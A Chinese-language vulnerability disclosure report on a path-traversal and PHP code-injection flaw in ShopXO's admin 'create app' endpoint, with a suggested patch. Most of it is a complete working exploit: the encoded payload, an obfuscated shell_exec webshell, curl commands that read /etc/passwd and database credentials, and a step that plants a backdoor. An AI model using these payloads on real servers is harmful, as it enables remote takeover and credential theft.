# 漏洞披露报告 · ShopXO 后台「创建应用」接口参数未过滤 → 路径穿越 + PHP 代码注入 → 远程代码执行（RCE）

| 项 | 值 |
|---|---|
| 漏洞名称 | ShopXO 后台应用管理「创建应用」接口（`Pluginsadmin::Save` → `PluginsAdminService::PluginsSave`）未对 `plugins` / `name` 参数做有效校验，导致路径穿越 + PHP 代码注入 → **远程代码执行** |
| 漏洞等级 | **严重（Critical）** |
| CVSS 3.1 | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` = **9.1**（官方计分库核算）<br>若按 Scope:Unchanged 评估则为 `7.2`；两种口径都给出，便于 CNA 选择 |
| CWE | **CWE-22**（Path Traversal）+ **CWE-94**（Code Injection）；最终后果达 **CWE-78**（OS Command Injection）量级 |
| 影响版本 | **ShopXO ≤ 6.9.2**（实测确认）<br>· 6.9.1 Release 20260803 —— 已复现<br>· **6.9.2 Release 20260928（当前最新版）—— 2026-10-09 复测仍可完整利用** |
| 漏洞地址 | 入口：`POST /<后台入口>?s=/pluginsadmin/save`<br>结果：`http://<target>/<目录>/admin/Admin.php?cmd=<命令>` |
| 验证状态 | **已完整利用**（未授权命令执行 `uid=1001(www)` + 任意文件读 + 落地独立后门），实机复现 |
| 复现脚本 | `shopox-RCE.py`（参数化，无内置目标；`--mode shell` 一键落地 `?cmd=` 木马） |
| 报告日期 | 2026-10-09 |

---

## 一、原理讲解

ShopXO 后台有个正常功能叫「应用管理 → 创建应用」：管理员填个应用名，系统就会在服务器上**自动生成一套 PHP 代码文件**（这是给插件开发者用的脚手架）。

这个功能在两个地方偷懒了，凑在一起就成了任意代码执行：

### 偷懒点 1：应用标识被直接拼进文件路径（路径穿越）

```php
// app/service/PluginsAdminService.php:675
$app_dir = APP_PATH.'plugins'.DS.$plugins;   // $plugins 来自请求参数，未做路径校验
```

`$plugins` 只做了「黑名单」检查（不能叫 `view`、`shopxo`、`www`），**没有**检查它是否含 `/`、`..`、`;`、`#`。所以填 `x;#/../../../public/abc` 就能让生成目录**跑出插件目录、落到网站根目录（web 根）下面**。

> 打个比方：本该把文件放进"库房/插件柜"，但门牌号是用户自己写的，写 `../../` 就能把柜子搬到"大门口"。

### 偷懒点 2：应用名被直接插进生成文件的**注释**里（代码注入）

生成的 PHP 文件长这样（`app/service/PluginsAdminService.php:714-731` 的 heredoc 模板）：

```php
<?php
namespace app\plugins\<应用标识>\admin;

// <应用名> - 后台管理          ← 问题在这一行
class Admin { ... }
```

`<应用名>` 是**原样插进去的**，而且全局输入过滤只用 `htmlspecialchars`（它只转义 `& < > "`，**不处理换行符**）。所以应用名里写一个换行，就"跳出了注释"，下一行就成了**真正会被执行的 PHP 代码**：

```
应用名 = "x\n<?php 要执行的代码\n//"
```

> 相当于：让用户在"贴标签"的地方写字，但没禁止他按回车换行；他一换行，就写到标签外面去了，而那部分恰好是会被执行的代码。

### 两个偷懒点合起来

```
一次后台请求
  ├─ plugins = x;#/../../../public/abc   → 目录穿越到 web 根（`;#` 用于闭合 namespace 语句并注释掉行尾，否则文件语法错误）
  └─ name    = x\n<任意PHP代码>\n//      → 换行逃逸注释，写入任意代码
        ↓
生成 <网站根>/abc/admin/Admin.php（以及同目录 Hook.php）
        ↓
攻击者直接浏览器访问 http://<target>/abc/admin/Admin.php?cmd=id
        ↓
服务器执行命令（**这个请求完全不需要登录、不需要任何凭据**）
```

### 为什么"注入的代码不能带引号"

ShopXO 的全局请求过滤器是：

```php
// app/Request.php:15-17
class Request extends \think\Request
{
    protected $filter = ['htmlspecialchars'];   // 会把 ' " < > & 转成实体
}
```

所以注入的 PHP 代码**必须不含引号与尖括号**。做法是用 `chr()` 拼字符串：

| 想写 | 实际写成（零引号） |
|---|---|
| `'cmd'` | `chr(99).chr(109).chr(100)` |
| `$_GET['cmd']` | `$k=chr(99).chr(109).chr(100); $_GET[$k]` |
| `" 2>&1"` | `chr(32).chr(50).chr(62).chr(38).chr(49)` |

**注意**：这里只约束"注入时"的代码；木马**运行**时的参数（`?cmd=` 后面那一串）不经过 ShopXO 的过滤器，可以随便用引号、管道、重定向。

---

## 二、漏洞地址（源码定位）

> 下列行号同时适用于6.9.2之前的所有版本
| 环节 | 位置 |
|---|---|
| 入口（控制器） | `app/admin/controller/Pluginsadmin.php:169` `Save()` |
| 服务层 | `app/service/PluginsAdminService.php:601` `PluginsSave()` |
| 参数校验（只判非空） | `:604-651` `ParamsChecked`；`:658` `PowerCheck`（只判目录可写） |
| **校验失效点（黑名单形同虚设）** | `:1008-1014` `PluginsVerification()`；黑名单常量 `:35` `['view','shopxo','www']` |
| **路径穿越点** | `:675` `$app_dir = APP_PATH.'plugins'.DS.$plugins;` |
| **代码注入点** | `:716`（`namespace` 行插值 `$plugins`）、`:718`（注释行插值 `$params['name']`） |
| **Sink（写文件）** | `:870` `file_put_contents($app_dir.DS.'admin'.DS.'Admin.php', $admin)`<br>同族：`:874` `Hook.php`、`:906` `index/Index.php`；另有第二穿越点 `:851` |
| 触发（无鉴权） | web 根下生成的 `<目录>/admin/Admin.php`、`<目录>/admin/Hook.php`（不经框架路由，无任何鉴权） |

---

## 三、复现步骤（完整、可直接照做）

> 占位符：`<TARGET>`＝站点根地址；`<ADMIN_ENTRY>`＝后台入口文件名（安装时随机生成，见 §七 说明）。以下所有请求均为 HTTP 明文、无 WAF 特殊处理。

### 步骤 0 · 基线（证明文件原本不存在）

```http
GET /pocdir/admin/Admin.php HTTP/1.1
Host: <TARGET>

→ HTTP/1.1 404 Not Found
```

### 步骤 1 · 取得一个后台会话（这是唯一的前置条件）

```http
POST /<ADMIN_ENTRY>?s=/admin/login HTTP/1.1
Host: <TARGET>
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded

type=username&accounts=admin&pwd=<PASSWORD>

→ HTTP/1.1 200 OK
{"msg":"登录成功","code":0,"data":{"id":"1","token":"…","username":"admin","role_id":"1"}}
```

### 步骤 2 · 一键落地 `?cmd=` 命令执行木马（核心请求）

```http
POST /<ADMIN_ENTRY>?s=/pluginsadmin/save HTTP/1.1
Host: <TARGET>
Cookie: PHPSESSID=<管理员会话>
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded

plugins=x%3B%23%2F..%2F..%2F..%2Fpublic%2Fpocdir
&name=x%0Aecho%2090350131%3B%24k%3Dchr(99).chr(109).chr(100)%3B%24c%3Dissset(%24_GET%5B%24k%5D)%3F%24_GET%5B%24k%5D%3Achr(105).chr(100)%3Becho%20%40%5Cshell_exec(%24c.chr(32).chr(50).chr(62).chr(38).chr(49))%3B%0A%2F%2F
&logo=%2Fstatic%2Fupload%2Fx.png&author=a&author_url=http%3A%2F%2Fx.com
&version=1.0.0&desc=a&apply_terminal=pc&apply_version=1.0.0

→ HTTP/1.1 200 OK
{"msg":"操作成功","code":0,"data":""}
```

**未被 URL 编码的两个参数原文**：

```
plugins = x;#/../../../public/pocdir
name    = x
          echo 90350131;$k=chr(99).chr(109).chr(100);$c=isset($_GET[$k])?$_GET[$k]:chr(105).chr(100);echo @\shell_exec($c.chr(32).chr(50).chr(62).chr(38).chr(49));
          //
```

### 步骤 3 · 生成的木马长这样（服务端落盘内容）

```php
<?php
namespace app\plugins\x;#/../../../public/pocdir\admin;   // ← 穿越：namespace 被 ;# 闭合，行尾被 # 注释

// x
echo 90350131;$k=chr(99).chr(109).chr(100);$c=isset($_GET[$k])?$_GET[$k]:chr(105).chr(100);echo @\shell_exec($c.chr(32).chr(50).chr(62).chr(38).chr(49));
// - 后台管理                                             // ← 注入代码夹在注释之间，文件仍是合法 PHP（php -l 通过）
class Admin { public function index($params = []) { … } }
```

### 步骤 4 · **无任何凭据**触发命令执行

```http
GET /pocdir/admin/Admin.php?cmd=id HTTP/1.1
Host: <TARGET>
（无 Cookie）

→ HTTP/1.1 200 OK
90350131uid=1001(www) gid=1001(www) groups=1001(www)
```

`90350131` 是代码里的 marker（证明 PHP 代码被执行）；`uid=1001(www)` 是命令输出的真实结果（证明**命令执行**成立）。

更多命令（同样无需登录）：

```bash
curl "http://<TARGET>/pocdir/admin/Admin.php?cmd=whoami;hostname"
curl --get --data-urlencode "cmd=cat /etc/passwd | head -3" "http://<TARGET>/pocdir/admin/Admin.php"
curl --get --data-urlencode "cmd=cat /www/wwwroot/<项目>/config/database.php" "http://<TARGET>/pocdir/admin/Admin.php"
```

### 步骤 5 ·（可选）借木马落一个独立后门文件

命令经 URL 传入，不受 ShopXO 过滤器约束，可直接用管道与重定向：

```bash
curl --get --data-urlencode \
  "cmd=echo $(base64 -w0 shell.php) | base64 -d > /www/wwwroot/<项目>/public/pocdir/shell.php" \
  "http://<TARGET>/pocdir/admin/Admin.php"
curl "http://<TARGET>/pocdir/shell.php?cmd=id"        # → uid=1001(www)
```

### 步骤 6 · 一键脚本复现

```bash
python3 exp/shopox-RCE.py -u http://<TARGET> --admin-entry <ADMIN_ENTRY> \
        -a <ADMIN_USER> -p <ADMIN_PASSWORD> --mode shell
# 输出：http://<TARGET>/pocdir/admin/Admin.php?cmd=id    ← 浏览器直接访问即执行命令
# exit 0 = 复现成功
```

---

## 四、对照三件套（可验证性证明）

| 要素 | 内容 |
|---|---|
| **基线** | `GET /pocdir/admin/Admin.php` → **404**（文件不存在）；源码层面 `PluginsVerification()` 仅 3 元素黑名单 |
| **差分** | 发送步骤 2 请求后 → 同路径 **200**，响应体为注入代码的输出；目标机只读核验 `ls -la` 显示落地文件属主 `www:www`、时间戳与请求同刻 |
| **marker** | 唯一数字标记 `90350131` + 命令输出 `uid=1001(www) gid=1001(www) groups=1001(www)`（marker 证明代码执行、uid 证明命令执行） |

**6.9.2 复测记录（2026-10-09）**：

```
POST /admintqbya8.php?s=/pluginsadmin/save  plugins=x;#/../../../public/sxov692  → {"msg":"操作成功","code":0}
GET  /sxov692/admin/Admin.php?cmd=id（无 Cookie） → 200  90350131uid=1001(www) gid=1001(www) groups=1001(www)
```

---

## 五、影响

| 维度 | 说明 |
|---|---|
| **无凭据命令执行** | 落地文件不经框架路由、无任何鉴权；一旦落地，任何能访问该 URL 的人都能执行任意命令（实测 `uid=1001(www)`） |
| **主机文件任意读** | 命令执行走 OS shell，**不受 PHP `open_basedir` 约束**（实测可读 `/etc/passwd`、`/etc/hostname`、站点外目录），据此刻读取站点 `config/database.php`（数据库凭据） |
| **持久化** | 落地文件是真实 `.php`，不依赖框架运行态；管理员注销会话后依然可用 |
| **提权链** | 可据此写入任意后门文件、篡改站点源码、以 `www` 身份横向 |
| **权限放大** | 权限节点 **346「应用添加/编辑」** 与 **348「应用上传」/374「应用安装」** 在数据库中相互独立（`sxo_power` 实测）⇒ **仅被授予"应用添加/编辑"的低权管理员即可拿到命令执行**，绕过了权限模型对"可投放代码"的隔离设计 |
| **环境缓解不等于无害** | 若主机 `disable_functions` 屏蔽了 `system/exec/shell_exec`，攻击者仍取得**任意 PHP 代码执行**（等价能力：任意文件读写、数据库读写、会话伪造、落盘 webshell） |

---

## 六、修复建议（可直接打补丁）

```diff
--- a/app/service/PluginsAdminService.php
+++ b/app/service/PluginsAdminService.php
@@ 668-675  PluginsSave()
     // 应用唯一标记
     $plugins = trim($params['plugins']);
+    // ① 标识白名单：仅小写字母/数字/下划线，从根上禁掉 / \ . ; # 等一切穿越字符
+    if(!preg_match('/^[a-z][a-z0-9_]{1,31}$/', $plugins))
+    {
+        return DataReturn(MyLang('common_service.pluginsadmin.app_name_error_tips'), -1);
+    }
     $app_dir = APP_PATH.'plugins'.DS.$plugins;
+    // ② 落地目录边界断言（realpath 归一化 + 前缀比对；同仓库正确写法见
+    //    app/service/FormInputService.php:812-817）
+    $base = realpath(APP_PATH.'plugins').DIRECTORY_SEPARATOR;
+    $real = realpath($app_dir);
+    if($real === false || strncmp($real, $base, strlen($base)) !== 0)
+    {
+        return DataReturn(MyLang('common_service.pluginsadmin.app_name_error_tips'), -1);
+    }

@@ 714-718  PluginsApplicationCreated() 生成 PHP 模板
-$admin=<<<php
-<?php
-namespace app\plugins\\$plugins\admin;
-
-// {$params['name']} - 后台管理
+// ③ 凡写入 PHP 模板的请求值，一律 var_export 转义（同仓库范例 app/service/PaymentService.php:1084）
+$plugins_export = var_export($plugins, true);
+// ④ 文本字段剥离换行/控制字符
+$name_export    = var_export(preg_replace('/[\r\n\x00-\x1f]+/', '', (string)$params['name']), true);
+$admin=<<<php
+<?php
+namespace app\plugins\\{$plugins_export}\admin;
+
+// {$name_export} - 后台管理
```

